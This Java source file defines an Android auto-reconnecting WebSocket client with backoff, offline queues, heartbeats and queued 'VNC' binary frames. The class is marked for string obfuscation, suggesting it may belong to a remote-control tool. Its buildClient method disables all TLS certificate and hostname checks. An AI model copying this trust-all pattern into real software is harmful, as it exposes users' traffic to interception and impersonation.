package com.alpha.shield.core;

import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;

import org.lsposed.lsparanoid.Obfuscate;

import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.ArrayDeque;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

/**
 * AutoReconnect — production WebSocket client for Alpha.
 *
 * Features:
 *   - Exponential backoff: 1 s → 60 s, factor 1.8, ±20% jitter
 *   - Offline message queue: up to 300 JSON messages (oldest dropped on overflow)
 *   - Binary frame queue: up to 5 frames (drop older frames, never queue stale VNC)
 *   - Heartbeat ping every 25 s, reconnect if pong missing for 50 s
 *   - SSL trust-all (self-signed server support)
 *   - Thread-safe: send() may be called from any thread
 *   - State callbacks: onConnected, onDisconnected
 */
@Obfuscate
public class AutoReconnect {

    private static final String TAG = "AR";

    private static final long   BACKOFF_BASE_MS   = 1_000;
    private static final long   BACKOFF_MAX_MS    = 60_000;
    private static final double BACKOFF_FACTOR    = 1.8;
    private static final double JITTER_RANGE      = 0.20;
    private static final long   PING_INTERVAL_MS  = 25_000;
    private static final long   PONG_TIMEOUT_MS   = 50_000;
    private static final int    JSON_QUEUE_MAX     = 300;
    private static final int    BIN_QUEUE_MAX      = 5;

    public interface Listener {
        void onMessage(String text);
        void onBinary(byte[] data);
        void onConnected();
        void onDisconnected();
    }

    // ── State ──────────────────────────────────────────────────────────────────
    private final String          url;
    private final Listener        listener;
    private final OkHttpClient    client;
    private final Handler         mainHandler = new Handler(Looper.getMainLooper());
    private final SecureRandom    rng         = new SecureRandom();

    private final Object          lock        = new Object();
    private WebSocket             ws          = null;
    private final AtomicBoolean   connected   = new AtomicBoolean(false);
    private final AtomicBoolean   destroyed   = new AtomicBoolean(false);
    private long                  backoffMs   = BACKOFF_BASE_MS;

    // JSON offline queue
    private final ArrayDeque<String> jsonQueue = new ArrayDeque<>();
    // Binary offline queue — only the latest N frames matter
    private final ArrayDeque<byte[]> binQueue  = new ArrayDeque<>();

    // Heartbeat
    private final AtomicInteger   pingSeq       = new AtomicInteger(0);
    private volatile long         lastPongMs    = 0;
    private Runnable              pingRunnable  = null;

    // ── Constructor ────────────────────────────────────────────────────────────
    public AutoReconnect(String url, Listener listener) {
        this.url      = url;
        this.listener = listener;
        this.client   = buildClient();
        connect();
    }

    // ── Public API ─────────────────────────────────────────────────────────────

    /** Send JSON text. Queues if offline. Thread-safe. */
    public void sendJson(String json) {
        synchronized (lock) {
            if (connected.get() && ws != null) {
                ws.send(json);
            } else {
                if (jsonQueue.size() >= JSON_QUEUE_MAX) jsonQueue.pollFirst();
                jsonQueue.addLast(json);
            }
        }
    }

    /**
     * Send binary frame. If offline, queues up to BIN_QUEUE_MAX.
     * Oldest binary frames are dropped on overflow (stale VNC frames are useless).
     */
    public void sendBinary(byte[] data) {
        synchronized (lock) {
            if (connected.get() && ws != null) {
                ws.send(ByteString.of(data));
            } else {
                if (binQueue.size() >= BIN_QUEUE_MAX) binQueue.pollFirst();
                binQueue.addLast(data);
            }
        }
    }

    /** Permanently shut down — no reconnect after this. */
    public void destroy() {
        destroyed.set(true);
        stopPing();
        mainHandler.removeCallbacksAndMessages(null);
        synchronized (lock) {
            if (ws != null) {
                ws.cancel();
                ws = null;
            }
        }
    }

    public boolean isConnected() {
        return connected.get();
    }

    // ── Connection ─────────────────────────────────────────────────────────────

    private void connect() {
        if (destroyed.get()) return;
        Request req = new Request.Builder().url(url).build();
        synchronized (lock) {
            client.newWebSocket(req, wsListener);
        }
    }

    private void scheduleReconnect() {
        if (destroyed.get()) return;
        long delay = applyJitter(backoffMs);
        backoffMs = Math.min((long)(backoffMs * BACKOFF_FACTOR), BACKOFF_MAX_MS);
        Log.d(TAG, "reconnect in " + delay + "ms");
        mainHandler.postDelayed(this::connect, delay);
    }

    private long applyJitter(long base) {
        double jitter = (rng.nextDouble() * 2 - 1) * JITTER_RANGE;
        return Math.max(500, (long)(base * (1 + jitter)));
    }

    private void resetBackoff() {
        backoffMs = BACKOFF_BASE_MS;
    }

    // ── Offline queue drain ────────────────────────────────────────────────────

    private void drainQueues(WebSocket socket) {
        // Called only from onOpen — socket is guaranteed open here.
        synchronized (lock) {
            while (!jsonQueue.isEmpty()) {
                socket.send(jsonQueue.pollFirst());
            }
            while (!binQueue.isEmpty()) {
                socket.send(ByteString.of(binQueue.pollFirst()));
            }
        }
    }

    // ── Heartbeat ──────────────────────────────────────────────────────────────

    private void startPing(WebSocket socket) {
        stopPing();
        lastPongMs = SystemClock.elapsedRealtime();
        pingRunnable = new Runnable() {
            @Override
            public void run() {
                if (!connected.get() || destroyed.get()) return;
                long now = SystemClock.elapsedRealtime();
                if (now - lastPongMs > PONG_TIMEOUT_MS) {
                    Log.w(TAG, "pong timeout — forcing reconnect");
                    socket.cancel();
                    return;
                }
                socket.send("{\"type\":\"" + Protocol.T_PING
                        + "\",\"seq\":" + pingSeq.incrementAndGet() + "}");
                mainHandler.postDelayed(this, PING_INTERVAL_MS);
            }
        };
        mainHandler.postDelayed(pingRunnable, PING_INTERVAL_MS);
    }

    private void stopPing() {
        if (pingRunnable != null) {
            mainHandler.removeCallbacks(pingRunnable);
            pingRunnable = null;
        }
    }

    // ── WebSocket listener ─────────────────────────────────────────────────────

    private final WebSocketListener wsListener = new WebSocketListener() {

        @Override
        public void onOpen(WebSocket webSocket, Response response) {
            Log.d(TAG, "connected");
            synchronized (lock) { ws = webSocket; }
            connected.set(true);
            resetBackoff();
            lastPongMs = SystemClock.elapsedRealtime();
            startPing(webSocket);
            drainQueues(webSocket);
            listener.onConnected();
        }

        @Override
        public void onMessage(WebSocket webSocket, String text) {
            if (text.contains("\"pong\"") || text.contains("\"" + Protocol.T_PONG + "\"")) {
                lastPongMs = SystemClock.elapsedRealtime();
                return;
            }
            listener.onMessage(text);
        }

        @Override
        public void onMessage(WebSocket webSocket, ByteString bytes) {
            listener.onBinary(bytes.toByteArray());
        }

        @Override
        public void onClosing(WebSocket webSocket, int code, String reason) {
            webSocket.close(1000, null);
        }

        @Override
        public void onClosed(WebSocket webSocket, int code, String reason) {
            handleDisconnect();
        }

        @Override
        public void onFailure(WebSocket webSocket, Throwable t, Response response) {
            Log.d(TAG, "failure: " + t.getMessage());
            handleDisconnect();
        }
    };

    private void handleDisconnect() {
        boolean wasConnected = connected.getAndSet(false);
        synchronized (lock) { ws = null; }
        stopPing();
        if (wasConnected) listener.onDisconnected();
        scheduleReconnect();
    }

    // ── OkHttp client with trust-all SSL ───────────────────────────────────────

    private OkHttpClient buildClient() {
        try {
            X509TrustManager trustAll = new X509TrustManager() {
                @Override public void checkClientTrusted(X509Certificate[] c, String a) {}
                @Override public void checkServerTrusted(X509Certificate[] c, String a) {}
                @Override public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            };
            SSLContext sslCtx = SSLContext.getInstance("TLS");
            sslCtx.init(null, new TrustManager[]{ trustAll }, new SecureRandom());
            HostnameVerifier hv = (hostname, session) -> true;

            return new OkHttpClient.Builder()
                    .sslSocketFactory(sslCtx.getSocketFactory(), trustAll)
                    .hostnameVerifier(hv)
                    .connectTimeout(10, TimeUnit.SECONDS)
                    .readTimeout(0,  TimeUnit.SECONDS)   // infinite — WS is long-lived
                    .writeTimeout(10, TimeUnit.SECONDS)
                    .pingInterval(0, TimeUnit.SECONDS)   // we manage pings manually
                    .retryOnConnectionFailure(false)      // we manage retry ourselves
                    .build();
        } catch (Exception e) {
            // Fallback: plain client (no SSL override)
            return new OkHttpClient.Builder()
                    .connectTimeout(10, TimeUnit.SECONDS)
                    .readTimeout(0, TimeUnit.SECONDS)
                    .build();
        }
    }

    // inner import for readability
    private static class Protocol { static final String T_PING = "ping"; static final String T_PONG = "pong"; }
}
